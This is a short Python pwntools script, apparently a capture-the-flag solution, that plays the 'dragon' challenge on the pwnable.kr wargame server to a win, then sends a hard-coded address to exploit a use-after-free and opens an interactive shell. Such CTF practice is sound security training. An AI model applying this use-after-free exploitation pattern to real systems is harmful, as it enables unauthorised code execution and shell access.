from pwn import *


class DragonExploit(object):

    WIN_GAME_SEQUENCE = "1111332332332332"
    SYSTEM_BIN_SH_ADDRESS = 0x08048DBF

    def __init__(self) -> None:
        self.shell = remote('pwnable.kr', 9004)

    def exploit_uaf(self):
        self.shell.sendline(p32(self.SYSTEM_BIN_SH_ADDRESS))

    def win_game(self):
        print(self.shell.recv())
        print(self.shell.recv())
        for c in self.WIN_GAME_SEQUENCE:
            self.shell.sendline(c)
            print(self.shell.recv())

        print(self.shell.recv())

    def run(self):
        self.win_game()
        self.exploit_uaf()
        print(self.shell.recv())
        self.shell.interactive()


if __name__ == '__main__':
    DragonExploit().run()
